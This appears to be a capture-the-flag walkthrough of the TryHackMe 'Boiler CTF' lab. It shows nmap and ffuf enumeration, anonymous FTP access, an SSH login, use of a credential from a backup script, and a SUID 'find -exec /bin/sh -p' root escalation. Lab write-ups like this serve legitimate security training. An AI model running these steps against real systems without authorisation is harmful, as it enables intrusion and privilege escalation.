## Boiler CTF
https://tryhackme.com/room/boilerctf2

## Enum
```
nmap -sV -sC -sT 10.10.185.145 -vv
Scanning 10.10.185.145 [1000 ports]
Discovered open port 80/tcp on 10.10.185.145
Discovered open port 21/tcp on 10.10.185.145
Discovered open port 10000/tcp on 10.10.185.145
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.18.90.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry
|_/
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: EEA082250DD48C7BA4DC1C4A4DA6E6D8
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Unix
```

```
ftp> open 10.10.185.145
Connected to 10.10.185.145.
220 (vsFTPd 3.0.3)
Name (10.10.185.145:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44702|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||49016|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
ftp> close
```

```
cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

![image](https://user-images.githubusercontent.com/6504854/183457849-14cef4ac-d678-42c0-861c-4ff928e7e521.png)

![image](https://user-images.githubusercontent.com/6504854/183458086-27cbbb06-9425-46ac-b7d8-e133f86666e5.png)

![image](https://user-images.githubusercontent.com/6504854/183458171-0971f1f0-4226-4fa0-b173-004cd1844c93.png)

![image](https://user-images.githubusercontent.com/6504854/183458310-398802de-c1de-4aab-937e-af599b01cb13.png)

🏴 I had no credentials, just do another enum...
```
ffuf -u http://10.10.185.145/joomla/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.tx
t
```
```
________________________________________________

.htaccess               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 5127ms]
.hta                    [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 5151ms]
.htpasswd               [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 5092ms]
_archive                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 445ms]
_database               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 395ms]
_files                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 385ms]
_test                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 420ms]
administrator           [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 430ms]
bin                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 463ms]
build                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 590ms]
cache                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 578ms]
components              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 619ms]
images                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 310ms]
includes                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 314ms]
index.php               [Status: 200, Size: 12484, Words: 772, Lines: 259, Duration: 367ms]
installation            [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 296ms]
language                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 311ms]
layouts                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 275ms]
libraries               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 302ms]
media                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 283ms]
modules                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 282ms]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 294ms]
templates               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 299ms]
tests                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 350ms]
tmp                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 324ms]
~www                    [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 293ms]
:: Progress: [4712/4712] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/183459470-50505fea-73bf-48ad-8043-5386515aa148.png)

![image](https://user-images.githubusercontent.com/6504854/183459562-83c0b8aa-e996-46ef-8c00-cf12548a35f6.png)

![image](https://user-images.githubusercontent.com/6504854/183459625-8e9d8923-3b8e-465b-9358-68715ebada75.png)

![image](https://user-images.githubusercontent.com/6504854/183459701-fc091325-50b7-48d4-9dc8-b125b1282aa8.png)

![image](https://user-images.githubusercontent.com/6504854/183459816-8e294856-0dfd-4bc6-ac20-0d26b4dfc82e.png)

![image](https://user-images.githubusercontent.com/6504854/183460144-97645622-3aa0-4552-9934-4d3c5d4a939c.png)

![キャプチャ](https://user-images.githubusercontent.com/6504854/183460870-f066d248-b12e-43c6-9923-d22d877fafe6.PNG)

![キャプチャ2](https://user-images.githubusercontent.com/6504854/183460887-a739d8bb-905a-480a-9728-e69636f10309.PNG)

![キャプチャ3](https://user-images.githubusercontent.com/6504854/183460899-5c719b09-1636-4ab2-9ec5-00468a953c29.PNG)

🏴 Finally, I got the credential. 

## Flag

```
ssh basterd@10.10.134.119 -p 55007
```
Nmapセンパイがまわらなかったのでポート決め打ちで... 😢

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.

Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199

$ ls
backup.sh
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#*****************
```

🏴 I got another credential for hardcoding.

```
$ su stoner
Password:

stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

🏴 Let's search some module has SUID bit.
```
stoner@Vulnerable:~$  find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
```

```
stoner@Vulnerable:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Thank you for your time! Happy hacking 😄

🔥 🐙 🔥 🐙 🔥 🐙

涼しい部屋でアイス食べながらBoxやるのめちゃたのしい。 🍦 😋
